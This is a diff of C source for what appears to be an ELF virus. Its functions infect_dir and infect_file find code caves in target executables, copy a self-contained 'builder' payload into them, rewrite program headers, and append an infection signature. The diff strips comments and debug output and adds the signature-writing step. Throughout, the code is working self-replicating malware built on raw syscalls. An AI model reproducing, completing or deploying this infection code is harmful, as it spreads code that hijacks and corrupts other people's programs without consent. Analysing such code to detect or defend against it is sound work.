@@ -39,7 +39,6 @@ typedef struct {
     uint64_t size;
 } entry;
 
-// Syscall wrapper
 __attribute__((always_inline)) inline long sys(long n, long arg1, long arg2, long arg3, long arg4, long arg5, long arg6);
 __attribute__((always_inline)) inline void ft_exit(int exit_code);
 __attribute__((always_inline)) inline int ft_open(volatile char *path, volatile int flags, volatile mode_t mode);
@@ -51,7 +50,6 @@ __attribute__((always_inline)) inline int ft_lseek(int fd, off_t offset, int whe
 __attribute__((always_inline)) inline uint64_t ft_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
 __attribute__((always_inline)) inline int64_t ft_munmap(void *addr, size_t length);
 
-// Functions
 __attribute__((always_inline)) static inline int infect_dir(volatile char *dir_path, volatile int fd_self);
 __attribute__((always_inline)) static inline int infect_file(volatile char *path, volatile file *file_self);
 __attribute__((always_inline)) inline int file_mmap(int fd, volatile file *file);
@@ -75,69 +73,68 @@ __attribute__((always_inline)) inline uint64_t offset_to_addr(volatile file *fil
 __attribute__((always_inline)) inline int file_write(int fd, volatile file *file);
 __attribute__((always_inline)) inline uint64_t old_entry_get(volatile file *file);
 
-// Helpers
 __attribute__((always_inline)) inline int ft_strlen(volatile char *str);
 __attribute__((always_inline)) inline void ft_strncpy(volatile char *src, volatile char *dst, size_t size);
 __attribute__((always_inline)) inline int ft_strstr(volatile char *haystack, volatile char *needle, size_t size);
 __attribute__((always_inline)) inline void ft_memcpy(volatile void *src, volatile void *dst, uint64_t size);
-//
-// __attribute__((always_inline)) inline void
-// print_number_hex(volatile uint64_t num) {
-//     char buf[20];
-//     int pos = 0;
-//
-//     if (num == 0) {
-//         char c = '0';
-//         ft_write(1, &c, 1);
-//         return;
-//     }
-//
-//     while (num > 0) {
-//         uint64_t cur = num % 16;
-//         if (cur < 10)
-//             buf[pos++] = '0' + cur;
-//         else
-//             buf[pos++] = 'a' + cur - 10;
-//         num /= 16;
-//     }
-//
-//     while (pos > 0) {
-//         char c = buf[--pos];
-//         ft_write(1, &c, 1);
-//     }
-// }
-//
-// __attribute__((always_inline)) inline void
-// print_number(volatile uint64_t num) {
-//     char buf[20];
-//     int pos = 0;
-//
-//     if (num == 0) {
-//         char c = '0';
-//         ft_write(1, &c, 1);
-//         return;
-//     }
-//
-//     while (num > 0) {
-//         buf[pos++] = '0' + (num % 10);
-//         num /= 10;
-//     }
-//
-//     while (pos > 0) {
-//         char c = buf[--pos];
-//         ft_write(1, &c, 1);
-//     }
-// }
-//
-// __attribute__((always_inline)) static inline void
-// ft_exit_incubation() {
-//     int fd_is_incubator = ft_open(incubation, O_RDONLY, 0);
-//     if (fd_is_incubator < 0) {
-//         ft_exit(0);
-//     }
-//     ft_close(fd_is_incubator);
-// }
-//
+
+__attribute__((always_inline)) inline void
+print_number_hex(volatile uint64_t num) {
+    char buf[20];
+    int pos = 0;
+
+    if (num == 0) {
+        char c = '0';
+        ft_write(1, &c, 1);
+        return;
+    }
+
+    while (num > 0) {
+        uint64_t cur = num % 16;
+        if (cur < 10)
+            buf[pos++] = '0' + cur;
+        else
+            buf[pos++] = 'a' + cur - 10;
+        num /= 16;
+    }
+
+    while (pos > 0) {
+        char c = buf[--pos];
+        ft_write(1, &c, 1);
+    }
+}
+
+__attribute__((always_inline)) inline void
+print_number(volatile uint64_t num) {
+    char buf[20];
+    int pos = 0;
+
+    if (num == 0) {
+        char c = '0';
+        ft_write(1, &c, 1);
+        return;
+    }
+
+    while (num > 0) {
+        buf[pos++] = '0' + (num % 10);
+        num /= 10;
+    }
+
+    while (pos > 0) {
+        char c = buf[--pos];
+        ft_write(1, &c, 1);
+    }
+}
+
+__attribute__((always_inline)) static inline void
+ft_exit_incubation() {
+    int fd_is_incubator = ft_open(incubation, O_RDONLY, 0);
+    if (fd_is_incubator < 0) {
+        ft_exit(0);
+    }
+    ft_close(fd_is_incubator);
+}
+
 __attribute__((always_inline)) static inline uint64_t
 parse_hex(volatile char *hex) {
     uint64_t result = 0;
@@ -161,14 +158,14 @@ parse_hex(volatile char *hex) {
 
     return result;
 }
-//
-// __attribute__((always_inline)) static inline void
-// print_nice(volatile uint64_t value) {
-//     char nl = '\n';
-//     ft_write(1, &nl, 1);
-//     print_number_hex(value);
-//     ft_write(1, &nl, 1);
-// }
+
+__attribute__((always_inline)) static inline void
+print_nice(volatile uint64_t value) {
+    char nl = '\n';
+    ft_write(1, &nl, 1);
+    print_number_hex(value);
+    ft_write(1, &nl, 1);
+}
 
 __attribute__((always_inline)) static inline uint64_t
 get_base_address() {
@@ -315,27 +312,17 @@ infect_file(volatile char *path, volatile file *file_self) {
     uint64_t *builder_self_table_start = builder_self_start + builder_self_size - 16;
     uint64_t *builder_self_table_size = builder_self_start + builder_self_size - 8;
 
-    char nl = '\n';
-
     volatile entry *entries_self = file_self->mem + *builder_self_table_start;
     uint64_t entries_self_num = *builder_self_table_size;
     uint64_t provided_space = code_caves_size_sum(code_caves_target, code_caves_target_num);
     uint64_t needed_space_table = code_caves_target_num * 16;
     uint64_t needed_space = entries_size_sum(entries_self, entries_self_num) + needed_space_table;
 
-    char ch = '^';
-    ft_write(1, &ch, 1);
-    ch = '\n';
-
     if (provided_space < needed_space) {
         file_munmap(&file_target);
         ft_close(fd_target);
         return 0;
     }
-
-    ch = '$';
-    ft_write(1, &ch, 1);
-    ch = '\n';
 
     uint64_t builder_target_start_offset = reserve_builder(&file_target, builder_self_start, builder_self_size, code_caves_target, code_caves_target_num);
     uint8_t not_enough_space_for_builder = builder_target_start_offset == 0;
@@ -346,13 +333,7 @@ infect_file(volatile char *path, volatile file *file_self) {
         return 0;
     }
 
-    ch = '!';
-    ft_write(1, &ch, 1);
-    ch = '\n';
-
-    ft_write(1, &ch, 1);
     Elf64_Ehdr *header_target = file_target.mem;
-    // enlarge the program header that is the
     for (int i = 0; i < header_target->e_phnum; i++) {
         Elf64_Phdr *table = file_target.mem + header_target->e_phoff;
         Elf64_Phdr *ph = table + i;
@@ -382,6 +363,11 @@ infect_file(volatile char *path, volatile file *file_self) {
         file_munmap(&file_target);
         ft_close(fd_target);
         return 0;
+    }
+
+    if (!ft_strstr(file_target.mem, signatur, file_target.size)) {
+        ft_lseek(fd_target, SEEK_END, 0);
+        ft_write(fd_target, signatur, 28);
     }
 
     file_munmap(&file_target);
@@ -467,8 +453,6 @@ reserve_scaffol_table(volatile file *file_target, volatile code_cave *code_caves
     for (int i = 0; i < code_caves_target_num; i++) {
         volatile code_cave *cave = code_caves_target + i;
         if (cave->size >= code_caves_target_num * 16) {
-            // for (int j = 0; j < code_caves_target_num * 16; j++)
-            //     ((char *)file_target->mem + cave->start)[j] = 0;
             cave->start += code_caves_target_num * 16;
             cave->size -= code_caves_target_num * 16;
             return cave->start - (code_caves_target_num * 16);
@@ -476,6 +460,7 @@ reserve_scaffol_table(volatile file *file_target, volatile code_cave *code_caves
     }
     return 0;
 }
+
 __attribute__((always_inline)) inline uint64_t
 reserve_builder(volatile file *file_target, volatile void *builder_self_start, volatile uint64_t builder_self_size, volatile code_cave *code_caves_target,
                 volatile uint64_t code_caves_target_num) {
@@ -502,6 +487,7 @@ ft_memcpy(volatile void *src, volatile void *dst, uint64_t size) {
     for (int i = 0; i < size; i++)
         dst_c[i] = src_c[i];
 }
+
 __attribute__((always_inline)) inline int
 ft_strlen(volatile char *str) {
     int i = 0;
@@ -516,6 +502,7 @@ ft_strncpy(volatile char *src, volatile char *dst, size_t size) {
     for (int i = 0; i < size; i++)
         dst[i] = src[i];
 }
+
 __attribute__((always_inline)) inline int
 ft_strstr(volatile char *haystack, volatile char *needle, size_t size) {
     const uint64_t NEEDLE_SIZE = ft_strlen(needle);
@@ -536,6 +523,7 @@ ft_strstr(volatile char *haystack, volatile char *needle, size_t size) {
     }
     return (0);
 }
+
 __attribute__((always_inline)) inline int
 elf64_ident_check(volatile const Elf64_Ehdr *header) {
     if (header->e_ident[EI_MAG0] != ELFMAG0) return 1;
@@ -636,7 +624,6 @@ addr_to_offset(volatile file *file, volatile uint64_t addr) {
 
     return 0;
 }
-//
 
 inline uint64_t
 code_caves_size_sum(volatile code_cave code_caves[], volatile uint64_t code_cave_num) {
@@ -654,8 +641,6 @@ entries_size_sum(volatile entry entries[], volatile uint64_t entries_num) {
     return total;
 }
 
-// SYS CALLS
-// __attribute__((always_inline))
 inline long
 sys(long n, long arg1, long arg2, long arg3, long arg4, long arg5, long arg6) {
     long ret;
@@ -670,10 +655,12 @@ __attribute__((always_inline)) inline void
 ft_exit(int exit_code) {
     sys(SYS_exit, exit_code, 0, 0, 0, 0, 0);
 }
+
 __attribute__((always_inline)) inline int
 ft_open(volatile char *path, volatile int flags, volatile mode_t mode) {
     return sys(SYS_open, (long)path, flags, mode, 0, 0, 0);
 }
+
 __attribute__((always_inline)) inline int
 ft_close(volatile int fd) {
     return sys(SYS_close, (long)fd, 0, 0, 0, 0, 0);
@@ -703,6 +690,7 @@ __attribute__((always_inline)) inline uint64_t
 ft_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset) {
     return sys(SYS_mmap, (long)addr, length, prot, flags, fd, offset);
 }
+
 __attribute__((always_inline)) inline int64_t
 ft_munmap(void *addr, size_t length) {
     int64_t ret = sys(SYS_munmap, (uint64_t)addr, length, 0, 0, 0, 0);
